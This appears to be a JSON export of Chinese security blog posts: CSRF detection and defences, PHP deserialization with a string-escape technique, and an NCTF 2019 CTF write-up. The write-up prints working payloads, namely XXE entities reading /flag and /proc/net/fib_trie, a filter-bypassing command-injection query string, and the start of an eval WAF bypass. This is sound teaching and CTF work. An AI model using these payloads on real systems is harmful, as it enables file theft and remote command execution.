title=\"漏洞检测\"></a>漏洞检测</h2><ol>\n<li>GET</li>\n</ol>\n<p>如果带有 token 等验证参数，先去掉参数尝试能否正常请求，如果可以即存在 CSRF 漏洞。</p>\n<ol start=\"2\">\n<li>POST</li>\n</ol>\n<p>最简单的方法就是抓取一个正常请求的数据包，去掉 token 等验证参数后提交，如果正常访问，再去掉 Referer 后重新提交，如果提交还有效，那么基本可以认为存在 CSRF 漏洞，可以构造外部 form 表单来进行提交。如果去掉 referer 失败还可以验证对 referer 校验是否严格尝试绕过。也可能存在代码对请求类型判断不严格($_REQUEST[])，如果 post 失败了尝试改成 get 进行请求。 </p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><h3 id=\"验证码\"><a href=\"#验证码\" class=\"headerlink\" title=\"验证码\"></a>验证码</h3><p>强制用户必须与应用完成交互，避免在不知情的情况下构造网络请求</p>\n<h3 id=\"Referer-Check\"><a href=\"#Referer-Check\" class=\"headerlink\" title=\"Referer Check\"></a>Referer Check</h3><p>检查请求是否来自合法的源，但是不足之处在于浏览器并非什么时候都能取到Referer.</p>\n<h3 id=\"Anti-CSRF-Token\"><a href=\"#Anti-CSRF-Token\" class=\"headerlink\" title=\"Anti CSRF Token\"></a>Anti CSRF Token</h3><p>将参数加密，或者使用一些真随机数，让攻击者无法猜测到参数值，达到“不可预测性原则”。可以新加一个参数 TOKEN ，同时放在表单和 session 中，服务端只需验证表单中的 TOKEN 和 session 中的 Token 是否一致，一致则认为是合法请求。 </p>\n","text":"CSRF 简单认识12/22/2019 11:47:20 AM 什么是CSRF跨站请求伪造-Cross Site Request Forgery，也被称作XSRF，简单来说就是 攻击者在不知道某个账户账号密码的情况下，利用目标站点已经登陆过的账户产生的身份凭证信息(cookie)","link":"","raw":null,"photos":[],"categories":[{"name":"渗透测试","slug":"渗透测试","count":5,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"CSRF","slug":"CSRF","count":1,"path":"api/tags/CSRF.json"}]},{"title":"序列化与反序列化","slug":"序列化与反序列化","date":"2019-12-12T03:47:20.000Z","updated":"2020-05-05T06:02:50.440Z","comments":true,"path":"api/articles/序列化与反序列化.json","excerpt":"","keywords":null,"cover":"https://i.imgur.com/pBO7lBu.png","content":"<h1 id=\"序列化与反序列化\"><a href=\"#序列化与反序列化\" class=\"headerlink\" title=\"序列化与反序列化\"></a>序列化与反序列化</h1><h2 id=\"0x01为什么要序列化\"><a href=\"#0x01为什么要序列化\" class=\"headerlink\" title=\"0x01为什么要序列化\"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p>\n<p><img src=\"https://i.imgur.com/pBO7lBu.png\" alt></p>\n<p>其中index.php代码如下：</p>\n<pre><code>&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p>\n<p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p>\n<p>看一个例子，简单的分析一下：</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $age = 0;\npublic $name = &apos;brain&apos;;\n\npublic function PrintInfo()\n{\n    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;\n}\n}\n$user =  new Test();\n$user-&gt;age = 20;\n$user-&gt;name = &apos;Jack&apos;;\n$user-&gt;PrintInfo();\necho serialize($user);\n\n?&gt;</code></pre><p>输出结果如下</p>\n<p><img src=\"https://i.imgur.com/bqenWI4.png\" alt></p>\n<p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p>\n<h2 id=\"魔法函数\"><a href=\"#魔法函数\" class=\"headerlink\" title=\"魔法函数\"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $variable = &quot;BRAIN&quot;;\npublic $variable1 = &quot;BRAVO&quot;;\npublic function PrintVariable()\n{\n    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;\n}\npublic function __construct()\n{\n    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;\n}\npublic function __destruct()\n{\n    echo &apos;__destruct&lt;br /&gt;&apos;;\n}\npublic function __wakeup()\n{\n    echo &apos;__wakeup&lt;br /&gt;&apos;;\n}\npublic function __sleep()\n{\n    echo &apos;__sleep&lt;br /&gt;&apos;;\n    return array(&apos;variable&apos; , &apos;variable1&apos;);\n}\n}    \n$obj = new Test();  //创建对象时调用__construct\n\n$serialized = serialize($obj); //序列化对象时调用__sleep\n\nprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);\n\n$obj2 = unserialize($serialized); //重建对象调用 __wakeup\n\n$obj2-&gt;PrintVariable(); //调用方法输出数据\n//脚本结束调用__destruct\n?&gt;</code></pre><p>这是执行结果：</p>\n<p><img src=\"https://i.imgur.com/Eb6Ax4I.png\" alt></p>\n<p>可以看到各个函数的执行顺序。</p>\n<h2 id=\"漏洞产生\"><a href=\"#漏洞产生\" class=\"headerlink\" title=\"漏洞产生\"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p>\n<p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p>\n<pre><code>    idnex.php\n\n&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;\n\n\nshield.php\n\n&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p>\n<p>我们的想法就是控制$file的值为pctf.php</p>\n<pre><code>&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$a = new Shield(&quot;pctf.php&quot;);\necho serialize($a);\n?&gt;\n序列化结果\nO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p>\n<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p>\n<p><img src=\"https://i.imgur.com/rAYet4u.png\" alt></p>\n<h2 id=\"ROP-Return-Oriented-programming-链\"><a href=\"#ROP-Return-Oriented-programming-链\" class=\"headerlink\" title=\"ROP(Return-Oriented programming)链\"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p>\n<blockquote>\n<p>1.存在序列化字符串的可控制点或者说是输入点</p>\n<p>2.存在可以利用的魔法函数</p>\n</blockquote>\n<h2 id=\"反序列化字符串逃逸\"><a href=\"#反序列化字符串逃逸\" class=\"headerlink\" title=\"反序列化字符串逃逸\"></a>反序列化字符串逃逸</h2><p>当我们在序列化过程中遇到过滤函数，这种过滤可能是</p>\n<ul>\n<li>过滤后长度增加</li>\n<li>过滤后长度减少</li>\n</ul>\n<p>当要反序列化的字符串长度发生变化时，就可能会出现字符串逃逸的问题。</p>\n<p>比如我现在有如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$username = <span class=\"string\">'luc1fer3'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ser = <span class=\"keyword\">array</span>($username,$pwd);</span><br><span class=\"line\">var_dump(serialize($ser)).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$b = replace(serialize($ser));</span><br><span class=\"line\">var_dump($b).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>执行结果：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(<span class=\"number\">41</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer3<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span></span><br><span class=\"line\">string(<span class=\"number\">42</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer22<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span> <span class=\"comment\">//属性长度仍然是 8</span></span><br></pre></td></tr></table></figure>\n\n<p>这是长度增加的情况。现在考虑一种情况：我们要求更改密码为 <code>admin888</code> ，该怎么做？</p>\n<p>首先我们知道如果字符串的长度与序列化后的属性长度不同，反序列化是会报错的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:4:\"admin\";&#125;'</span>; <span class=\"comment\">//修改长度为4</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\">PHP Notice:  unserialize(): Error at offset <span class=\"number\">37</span> of <span class=\"number\">41</span> bytes</span><br><span class=\"line\">    bool(<span class=\"keyword\">false</span>)</span><br></pre></td></tr></table></figure>\n\n<p>并且，php 在反序列化时会把一些字符当作分隔符 <code>}</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:5:\"admin\";&#125;;i:2;s:2:\"ab\";&#125;'</span>; <span class=\"comment\">//识别到第一个 &#125; 之后就认为目标字符串结束，后面的会忽略掉。</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">8</span>) <span class=\"string\">\"luc1fer3\"</span></span><br><span class=\"line\">  [<span class=\"number\">1</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">5</span>) <span class=\"string\">\"admin\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>于是我们可以想到，如果我们自己构造一个特殊的字符串，手动闭合 <code>}</code> , 那我们就可以强行在反序列化之后塞入一个我们自己的属性。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$new_pwd = <span class=\"string\">'\";i:1;s:8:\"admin888\";&#125;'</span>; <span class=\"comment\">//length = 22 第一个双引号用来闭合 username</span></span><br></pre></td></tr></table></figure>\n\n<p>考虑到前面的过滤函数，我们的计划是设法使过滤后的长度增加（因为系列化后的字符串长度增加了，但是属性的长度并不变），让反系列化时系统读取的是过滤后增加的数据，然后把构造的数据变成新的属性：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;\";i:1;s:5:\"admin\";&#125;'</span> </span><br><span class=\"line\">    <span class=\"comment\">//注意这里我们根据构造的字符串长度增加了21个3，可以看到</span></span><br><span class=\"line\">    luc1fer3333333333333333333333<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125; </span></span><br><span class=\"line\"><span class=\"string\">    的长度是 8+21+22=73</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">' </span></span><br><span class=\"line\"><span class=\"string\">\t//过滤后51没变，但是</span></span><br><span class=\"line\"><span class=\"string\">luc1fer22222222222222222222222222222222222222222222\";i:1;s:8:\"admin888\";&#125;实际长度却变成了 8+21+22+22</span></span><br></pre></td></tr></table></figure>\n\n<p>每出现一个 3 就替换成 22 ,长度加 1 。 我们构造的字符串长度是 22 ，我们就需要使用 22 个(本来带的有一个，所以添加21个就可以) 3 来使长度增加22。</p>\n<p>从上面的例子可以看出，过滤后的属性长度51，在反系列化的时候刚好把替换后的数据读完，我们构造的数据闭合了双引号就逃逸出来变成新属性了。后面原来的属性会被忽略。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = <span class=\"string\">'luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = replace(serialize($ser));</span><br><span class=\"line\">var_dump($a).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">var_dump(unserialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\">string(<span class=\"number\">107</span>) <span class=\"string\">\"a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">array(2) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  [0]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(51) \"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  [1]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(8) \"</span>admin888<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n","text":"序列化与反序列化0x01为什么要序列化php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的： [Figure] ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"NCTF","slug":"NCTF","date":"2019-11-26T12:45:31.000Z","updated":"2020-04-29T05:45:19.118Z","comments":true,"path":"api/articles/NCTF.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"NCTF\"><a href=\"#NCTF\" class=\"headerlink\" title=\"NCTF\"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Fake-XML-cookbook\"><a href=\"#Fake-XML-cookbook\" class=\"headerlink\" title=\"Fake XML cookbook\"></a>Fake XML cookbook</h3><p>简单的xxe</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; \n\n&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id=\"ture-XML-cookbook\"><a href=\"#ture-XML-cookbook\" class=\"headerlink\" title=\"ture XML cookbook\"></a>ture XML cookbook</h3><p>常用的内网IP文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>\n<p><strong>requests</strong></p>\n<pre><code>&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;\n\n]&gt;\n\n\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>X-Powered-By: PHP/7.4.0RC6\n\n\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>解密：</p>\n<pre><code>Main:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST\nLocal:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST</code></pre><p>照着Ip访问，吐槽我的windows下burp响应全是乱码，搞了半天去kali就没事了。</p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__file__);\n$string_1 = $_GET[&apos;str1&apos;];\n$string_2 = $_GET[&apos;str2&apos;];\n$cmd = $_GET[&apos;q_w_q&apos;];\n\n\n//1st\nif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){\n    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;\n}\nelse{\n    die(&apos;23333333&apos;);\n}\n\n\n//2nd\nif(is_numeric($string_1)){\n    $md5_1 = md5($string_1);\n    $md5_2 = md5($string_2);\n    if($md5_1 != $md5_2){\n        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr — 查找字符串的首次出现，\n        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);\n        if($a == $b){\n            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;\n        }\n        else{\n            die(&quot;can u give me the right str???&quot;);\n        }\n    } \n    else{\n        die(&quot;no!!!!!!!!&quot;);\n    }\n}\nelse{\n    die(&apos;is str1 numeric??????&apos;);\n}\n\n\n//3rd\n$query = $_SERVER[&apos;QUERY_STRING&apos;];\nif (strlen($cmd) &gt; 8){\n    die(&quot;too long :(&quot;);\n}\n\nif( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){\n    $arr = explode(&apos; &apos;, $cmd);          //explode — 使用一个字符串分割另一个字符串\n    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){\n        if(substr_count($cmd, &apos;cat&apos;) === 0){\n            system($cmd);\n        }\n        else{\n            die(&apos;ban cat :) &apos;);\n        }\n    }\n    else{\n        die(&apos;bad guy!&apos;);\n    }\n}\nelse{\n    die(&apos;nonono _ is bad&apos;);\n}\n?&gt; </code></pre><p>第一层使用 %0a 截断绕过，第二层md5绕过<a href=\"https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83\" target=\"_blank\" rel=\"noopener\">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> 前面几条0e开头的字符串去解密发现都收费，所以我们使用 <code>s878926199a</code> ,加密完解密得 <code>2120624</code> ，我们可以用数字绕过第一个判断，第三层 使用 <code>.</code> 绕过 <code>_</code> ，<code>%20</code> 替代空格，使用<code>l${x}s</code> 列目录，<code>tac%20f*</code> 读 <code>flag</code> .</p>\n<p>看一个 <code>strstr()</code> 的例子</p>\n<pre><code>$email  = &apos;name@example.com&apos;;\n$domain = strstr($email, &apos;@&apos;);\necho $domain.&quot;\\r\\n&quot;; // 打印 @example.com\n\n$user = strstr($email, &apos;@&apos;, true); // 从 PHP 5.3.0 起\necho $user.&quot;\\r\\n&quot;; // 打印 name\nvar_dump(&quot;01&quot;==true);\n\n输出：\n@example.com\nname\nbool(true)</code></pre><p>payload:</p>\n<pre><code>?num=23333%0a\n&amp;str1=2120624\n&amp;str2=s214587387a\n&amp;q.w.q=tac%20f*</code></pre><h3 id=\"hacker-backdoor\"><a href=\"#hacker-backdoor\" class=\"headerlink\" title=\"hacker backdoor\"></a>hacker backdoor</h3><pre><code> &lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){\n    highlight_file(__file__);\n}\n$code = $_GET[&apos;code&apos;];\n$usrful = $_GET[&apos;useful&apos;];\n\nfunction waf($a){\n    $dangerous = get_defined_functions();    //get_defined_functions — 返回所有已定义函数的数组\n    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //压入栈底\n    foreach ($dangerous[&quot;internal&quot;] as $bad) {\n        if(strpos($a,$bad) !== FALSE){\n        return False;\n        break;\n        }\n    }\n    return True;\n}\n\nif(file_exists($usrful)){\n    if(waf($code)){\n        eval($code);\n    }\n    else{\n        die(&quot;oh,不能输入这些函数哦 :) &quot;);\n    }\n}</code></pre><p>测试一下$dangerous</p>\n<pre><code>&lt;?php  \n$dangerous = get_defined_functions();\narray_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);\nforeach ($dangerous[&quot;internal&quot;] as $bad) { \n    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){\n        echo &quot;badbad&quot;.&quot;\\r\\n&quot;;\n    }\n}\n?&gt;</code></pre><p>使用命令拼接绕过 waf()</p>\n<pre><code>?code=?&gt;&lt;?php 